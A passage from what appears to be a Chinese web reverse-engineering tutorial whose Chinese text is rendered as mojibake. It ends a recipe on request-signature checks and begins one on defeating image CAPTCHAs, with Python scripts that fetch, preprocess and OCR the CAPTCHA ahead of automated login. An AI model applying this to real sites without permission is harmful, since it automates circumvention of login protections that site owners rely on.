      </ol>

      <h3 id="ç­¾åçš„ä½œç”¨">ç­¾åçš„ä½œç”¨</h3>

      <pre><code>ç­¾å = Hash(æ‰€æœ‰å‚æ•° + å¯†é’¥)
</code></pre>

      <p>æœåŠ¡å™¨ä¹Ÿä½¿ç”¨ç›¸åŒç®—æ³•è®¡ç®—ç­¾åï¼Œå¦‚æœä¸ä¸€è‡´åˆ™æ‹’ç»è¯·æ±‚ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æœåŠ¡å™¨ç«¯éªŒè¯</span>
<span class="n">received_sign</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">]</span>
<span class="n">calculated_sign</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">username</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="n">timestamp</span> <span class="o">+</span> <span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="n">received_sign</span> <span class="o">!=</span> <span class="n">calculated_sign</span><span class="p">:</span>
    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;code&#39;</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;ç­¾åé”™è¯¯&#39;</span><span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³é…æ–¹">ğŸ“š ç›¸å…³é…æ–¹</h2>

      <h3 id="åŸºç¡€é…æ–¹">åŸºç¡€é…æ–¹</h3>

      <ul>
        <li><a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†ç®—æ³•è¯†åˆ«</a> - è¯†åˆ«åŠ å¯†ç®—æ³•</li>
        <li><a href="#03-Basic-Recipes-api-reverse-engineering">API é€†å‘</a> - API é€†å‘å®Œæ•´æµç¨‹</li>
      </ul>

      <h3 id="é«˜çº§é…æ–¹">é«˜çº§é…æ–¹</h3>

      <ul>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a> - å¤„ç†æ··æ·†ä»£ç </li>
        <li><a href="#04-Advanced-Recipes-javascript-vm-protection">JSVMP</a> - å¤„ç†è™šæ‹Ÿæœºä¿æŠ¤</li>
      </ul>

      <h3 id="æ¡ˆä¾‹ç ”ç©¶">æ¡ˆä¾‹ç ”ç©¶</h3>

      <ul>
        <li><a href="#05-Case-Studies-case-ecommerce">ç”µå•†ç½‘ç«™é€†å‘</a> - çœŸå®æ¡ˆä¾‹</li>
      </ul>

      <hr />

      <h2 id="æ­å–œ">ğŸ‰ æ­å–œï¼</h2>

      <p>ä½ å·²ç»æŒæ¡äº†ï¼š</p>

      <ul>
        <li>âœ… å®šä½åŠ å¯†å‡½æ•°çš„æ–¹æ³•</li>
        <li>âœ… åˆ†æå¸¸è§åŠ å¯†ç®—æ³•</li>
        <li>âœ… ç”¨ Python å¤ç°åŠ å¯†é€»è¾‘</li>
        <li>âœ… æ„é€ æœ‰æ•ˆçš„ API è¯·æ±‚</li>
      </ul>

      <p><strong>ä¸‹ä¸€æ­¥</strong>:</p>

      <ul>
        <li>å­¦ä¹  <a href="#00-Quick-Start-bypass-simple-captcha">ç»•è¿‡ç®€å•éªŒè¯ç </a></li>
        <li>æˆ–æ·±å…¥ <a href="#03-Basic-Recipes-api-reverse-engineering">API é€†å‘</a></li>
      </ul>

      <hr />

      <p><strong>å°è´´å£«</strong>:</p>

      <ul>
        <li>æ€»æ˜¯å…ˆåœ¨æµè§ˆå™¨ Console ä¸­éªŒè¯ä½ çš„ç†è§£</li>
        <li>è®°å½•ä½ åˆ†æè¿‡çš„åŠ å¯†ç®—æ³•ï¼Œå»ºç«‹è‡ªå·±çš„çŸ¥è¯†åº“</li>
        <li>é‡åˆ°ä¸æ‡‚çš„åŠ å¯†ç®—æ³•ï¼Œå¯ä»¥æœç´¢æˆ–å‚è€ƒ <a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
      </ul>

      <p>Happy Decrypting! ğŸ”</p>

    </div>

    <div class="section" id="00-Quick-Start-bypass-simple-captcha">
      <h2>4. Bypass Simple CAPTCHA</h2>
      <h1 id="é…æ–¹ç»•è¿‡ç®€å•éªŒè¯ç ">é…æ–¹ï¼šç»•è¿‡ç®€å•éªŒè¯ç </h1>

      <h2 id="é…æ–¹ä¿¡æ¯">ğŸ“Š é…æ–¹ä¿¡æ¯</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>éš¾åº¦</strong></td>
            <td>â­â­ (åˆçº§)</td>
          </tr>
          <tr>
            <td><strong>é¢„è®¡æ—¶é—´</strong></td>
            <td>30-45åˆ†é’Ÿ</td>
          </tr>
          <tr>
            <td><strong>æ‰€éœ€å·¥å…·</strong></td>
            <td>Python 3.7+, Tesseract OCR</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>è¯†åˆ«ç®€å•çš„å›¾å½¢éªŒè¯ç </td>
          </tr>
          <tr>
            <td><strong>å‰ç½®çŸ¥è¯†</strong></td>
            <td>Python åŸºç¡€, PIL/Pillow åº“</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="ä½ å°†å­¦åˆ°">ğŸ¯ ä½ å°†å­¦åˆ°</h2>

      <p>å®Œæˆè¿™ä¸ªé…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>âœ… åˆ†æéªŒè¯ç ç”Ÿæˆå’ŒéªŒè¯æµç¨‹</li>
        <li>âœ… æŠ“å–éªŒè¯ç å›¾ç‰‡</li>
        <li>âœ… ä½¿ç”¨ OCR æŠ€æœ¯è¯†åˆ«æ–‡å­—</li>
        <li>âœ… å›¾åƒé¢„å¤„ç†æé«˜è¯†åˆ«ç‡</li>
        <li>âœ… è‡ªåŠ¨åŒ–éªŒè¯ç è¯†åˆ«æµç¨‹</li>
        <li>âœ… åˆ¤æ–­ä½•æ—¶åº”è¯¥ä½¿ç”¨äººå·¥æ‰“ç å¹³å°</li>
      </ul>

      <hr />

      <h2 id="å‡†å¤‡å·¥ä½œ">ğŸ“ å‡†å¤‡å·¥ä½œ</h2>

      <h3 id="å®‰è£…ä¾èµ–">å®‰è£…ä¾èµ–</h3>

      <h4 id="1-å®‰è£…-python-åº“">1. å®‰è£… Python åº“</h4>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>pillow<span class="w"> </span>requests<span class="w"> </span>pytesseract<span class="w"> </span>opencv-python
</code></pre>
      </div>

      <h4 id="2-å®‰è£…-tesseract-ocr">2. å®‰è£… Tesseract OCR</h4>

      <p><strong>Windows</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä¸‹è½½å®‰è£…åŒ…</span>
https://github.com/UB-Mannheim/tesseract/wiki

<span class="c1"># å®‰è£…åé…ç½®ç¯å¢ƒå˜é‡</span>
<span class="nb">set</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>%PATH%<span class="p">;</span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\T</span>esseract-OCR
</code></pre>
      </div>

      <p><strong>macOS</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>brew<span class="w"> </span>install<span class="w"> </span>tesseract
</code></pre>
      </div>

      <p><strong>Linux</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>tesseract-ocr
sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>libtesseract-dev
</code></pre>
      </div>

      <h4 id="3-éªŒè¯å®‰è£…">3. éªŒè¯å®‰è£…</h4>

      <div class="codehilite">
        <pre><span></span><code>tesseract<span class="w"> </span>--version
<span class="c1"># è¾“å‡º: tesseract 5.x.x</span>
</code></pre>
      </div>

      <h3 id="æ£€æŸ¥æ¸…å•">æ£€æŸ¥æ¸…å•</h3>

      <ul>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å·²å®‰è£… Python 3.7+</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å·²å®‰è£…æ‰€æœ‰ä¾èµ–åº“</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> Tesseract OCR æ­£å¸¸å·¥ä½œ</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> äº†è§£åŸºæœ¬çš„ Python å’Œ HTTP è¯·æ±‚</li>
      </ul>

      <hr />

      <h2 id="æ­¥éª¤è¯¦è§£">ğŸš€ æ­¥éª¤è¯¦è§£</h2>

      <h3 id="step-1-åˆ†æéªŒè¯ç æµç¨‹">Step 1: åˆ†æéªŒè¯ç æµç¨‹</h3>

      <h4 id="11-è§‚å¯ŸéªŒè¯ç ">1.1 è§‚å¯ŸéªŒè¯ç </h4>

      <p>æ‰“å¼€ä¸€ä¸ªæœ‰éªŒè¯ç çš„ç™»å½•é¡µé¢ï¼ˆæˆ–ä½¿ç”¨ä¸‹é¢çš„ç¤ºä¾‹ï¼‰ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>éªŒè¯ç ç™»å½•<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>ç™»å½•<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;ç”¨æˆ·å&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;å¯†ç &quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;captcha&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/captcha&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;this.src=&#39;/captcha?&#39;+Date.now()&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;captcha_code&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;éªŒè¯ç &quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;login()&quot;</span><span class="p">&gt;</span>ç™»å½•<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">login</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">,</span>
<span class="w">            </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">,</span>
<span class="w">            </span><span class="nx">captcha</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;captcha_code&#39;</span><span class="p">).</span><span class="nx">value</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
<span class="w">        </span><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="w">          </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">result</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">message</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <h4 id="12-ç†è§£éªŒè¯æµç¨‹">1.2 ç†è§£éªŒè¯æµç¨‹</h4>

      <ol>
        <li><strong>è·å–éªŒè¯ç </strong>: <code>GET /captcha</code> â†’ è¿”å›å›¾ç‰‡</li>
        <li><strong>ç”¨æˆ·è¾“å…¥</strong>: äººå·¥è¯†åˆ«å¹¶è¾“å…¥</li>
        <li><strong>æäº¤éªŒè¯</strong>: <code>POST /api/login</code> å¸¦ä¸ŠéªŒè¯ç </li>
        <li><strong>æœåŠ¡å™¨éªŒè¯</strong>: æ¯”å¯¹ç­”æ¡ˆï¼Œè¿”å›ç»“æœ</li>
      </ol>

      <p><strong>å…³é”®ç‚¹</strong>:</p>

      <ul>
        <li>éªŒè¯ç å›¾ç‰‡ URL: <code>/captcha</code></li>
        <li>éªŒè¯ç éœ€è¦å’Œç™»å½•è¯·æ±‚ä¸€èµ·æäº¤</li>
        <li>é€šå¸¸æœ‰ä¼šè¯ï¼ˆCookieï¼‰å…³è”éªŒè¯ç å’Œç­”æ¡ˆ</li>
      </ul>

      <hr />

      <h3 id="step-2-æŠ“å–éªŒè¯ç å›¾ç‰‡">Step 2: æŠ“å–éªŒè¯ç å›¾ç‰‡</h3>

      <h4 id="21-ç¼–å†™æŠ“å–è„šæœ¬">2.1 ç¼–å†™æŠ“å–è„šæœ¬</h4>

      <p>åˆ›å»º <code>captcha_download.py</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">io</span><span class="w"> </span><span class="kn">import</span> <span class="n">BytesIO</span>

<span class="c1"># åˆ›å»ºä¼šè¯ï¼ˆä¿æŒ Cookieï¼‰</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">download_captcha</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">save_path</span><span class="o">=</span><span class="s1">&#39;captcha.png&#39;</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½éªŒè¯ç å›¾ç‰‡&quot;&quot;&quot;</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="c1"># ä¿å­˜å›¾ç‰‡</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">save_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>

        <span class="c1"># æ˜¾ç¤ºå›¾ç‰‡</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>
        <span class="n">img</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… éªŒè¯ç å·²ä¿å­˜åˆ°: </span><span class="si">{</span><span class="n">save_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">True</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âŒ ä¸‹è½½å¤±è´¥: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">False</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://example.com/captcha&#39;</span>
    <span class="n">download_captcha</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="22-è¿è¡Œæµ‹è¯•">2.2 è¿è¡Œæµ‹è¯•</h4>

      <div class="codehilite">
        <pre><span></span><code>python<span class="w"> </span>captcha_download.py
</code></pre>
      </div>

      <p><strong>è¾“å‡º</strong>: å›¾ç‰‡ä¼šè‡ªåŠ¨æ‰“å¼€ï¼Œå¹¶ä¿å­˜ä¸º <code>captcha.png</code></p>

      <hr />

      <h3 id="step-3-ocr-è¯†åˆ«éªŒè¯ç ">Step 3: OCR è¯†åˆ«éªŒè¯ç </h3>

      <h4 id="31-åŸºç¡€è¯†åˆ«">3.1 åŸºç¡€è¯†åˆ«</h4>

      <p>åˆ›å»º <code>captcha_ocr.py</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pytesseract</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>

<span class="k">def</span><span class="w"> </span><span class="nf">recognize_captcha</span><span class="p">(</span><span class="n">image_path</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è¯†åˆ«éªŒè¯ç &quot;&quot;&quot;</span>
    <span class="c1"># åŠ è½½å›¾ç‰‡</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">image_path</span><span class="p">)</span>

    <span class="c1"># OCR è¯†åˆ«</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">config</span><span class="o">=</span><span class="s1">&#39;--psm 7 digits&#39;</span><span class="p">)</span>

    <span class="c1"># æ¸…ç†ç»“æœï¼ˆå»é™¤ç©ºæ ¼å’Œæ¢è¡Œï¼‰</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è¯†åˆ«ç»“æœ: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">recognize_captcha</span><span class="p">(</span><span class="s1">&#39;captcha.png&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… éªŒè¯ç æ˜¯: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>å‚æ•°è¯´æ˜</strong>:</p>

      <ul>
        <li><code>--psm 7</code>: Page Segmentation Mode = 7ï¼ˆå•è¡Œæ–‡æœ¬ï¼‰</li>
        <li><code>digits</code>: åªè¯†åˆ«æ•°å­—</li>
      </ul>

      <h4 id="32-æµ‹è¯•è¯†åˆ«">3.2 æµ‹è¯•è¯†åˆ«</h4>

      <div class="codehilite">
        <pre><span></span><code>python<span class="w"> </span>captcha_ocr.py
</code></pre>
      </div>

      <p><strong>å¯èƒ½çš„é—®é¢˜</strong>: è¯†åˆ«ç‡å¾ˆä½æˆ–å®Œå…¨è¯†åˆ«ä¸å‡ºæ¥</p>

      <p><strong>åŸå› </strong>: éªŒè¯ç æœ‰å¹²æ‰°ï¼ˆå™ªç‚¹ã€çº¿æ¡ã€å€¾æ–œç­‰ï¼‰</p>

      <hr />

      <h3 id="step-4-å›¾åƒé¢„å¤„ç†">Step 4: å›¾åƒé¢„å¤„ç†</h3>

      <h4 id="41-å¢å¼ºè¯†åˆ«ç‡">4.1 å¢å¼ºè¯†åˆ«ç‡</h4>

      <p>åˆ›å»º <code>captcha_preprocess.py</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">cv2</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pytesseract</span>

<span class="k">def</span><span class="w"> </span><span class="nf">preprocess_image</span><span class="p">(</span><span class="n">image_path</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;é¢„å¤„ç†éªŒè¯ç å›¾ç‰‡&quot;&quot;&quot;</span>
    <span class="c1"># è¯»å–å›¾ç‰‡</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="n">image_path</span><span class="p">)</span>

    <span class="c1"># 1. è½¬ç°åº¦</span>
    <span class="n">gray</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cvtColor</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">COLOR_BGR2GRAY</span><span class="p">)</span>

    <span class="c1"># 2. äºŒå€¼åŒ–ï¼ˆå»é™¤å™ªç‚¹ï¼‰</span>
    <span class="n">_</span><span class="p">,</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">threshold</span><span class="p">(</span><span class="n">gray</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">THRESH_BINARY_INV</span> <span class="o">+</span> <span class="n">cv2</span><span class="o">.</span><span class="n">THRESH_OTSU</span><span class="p">)</span>

    <span class="c1"># 3. å»å™ªï¼ˆå½¢æ€å­¦æ“ä½œï¼‰</span>
    <span class="n">kernel</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">ones</span><span class="p">((</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
    <span class="n">opening</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">morphologyEx</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">MORPH_OPEN</span><span class="p">,</span> <span class="n">kernel</span><span class="p">,</span> <span class="n">iterations</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># 4. ä¿å­˜å¤„ç†åçš„å›¾ç‰‡</span>
    <span class="n">processed_path</span> <span class="o">=</span> <span class="s1">&#39;captcha_processed.png&#39;</span>
    <span class="n">cv2</span><span class="o">.</span><span class="n">imwrite</span><span class="p">(</span><span class="n">processed_path</span><span class="p">,</span> <span class="n">opening</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… é¢„å¤„ç†å®Œæˆ: </span><span class="si">{</span><span class="n">processed_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">processed_path</span>

<span class="k">def</span><span class="w"> </span><span class="nf">recognize_with_preprocess</span><span class="p">(</span><span class="n">image_path</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;é¢„å¤„ç†åè¯†åˆ«&quot;&quot;&quot;</span>
    <span class="c1"># é¢„å¤„ç†</span>
    <span class="n">processed_path</span> <span class="o">=</span> <span class="n">preprocess_image</span><span class="p">(</span><span class="n">image_path</span><span class="p">)</span>

    <span class="c1"># OCR è¯†åˆ«</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">processed_path</span><span class="p">)</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">config</span><span class="o">=</span><span class="s1">&#39;--psm 7 digits&#39;</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è¯†åˆ«ç»“æœ: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">recognize_with_preprocess</span><span class="p">(</span><span class="s1">&#39;captcha.png&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;âœ… éªŒè¯ç æ˜¯: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="42-å¯¹æ¯”æ•ˆæœ">4.2 å¯¹æ¯”æ•ˆæœ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åŸå§‹è¯†åˆ«</span>
python<span class="w"> </span>captcha_ocr.py
<span class="c1"># è¾“å‡º: 12O4 (é”™è¯¯)</span>

<span class="c1"># é¢„å¤„ç†åè¯†åˆ«</span>
python<span class="w"> </span>captcha_preprocess.py
<span class="c1"># è¾“å‡º: 1234 (æ­£ç¡®)</span>
</code></pre>
      </div>

      <hr />

      <h3 id="step-5-å®Œæ•´è‡ªåŠ¨åŒ–æµç¨‹">Step 5: å®Œæ•´è‡ªåŠ¨åŒ–æµç¨‹</h3>

      <h4 id="51-é›†æˆæ‰€æœ‰æ­¥éª¤">5.1 é›†æˆæ‰€æœ‰æ­¥éª¤</h4>

      <p>åˆ›å»º <code>auto_login.py</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pytesseract</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>
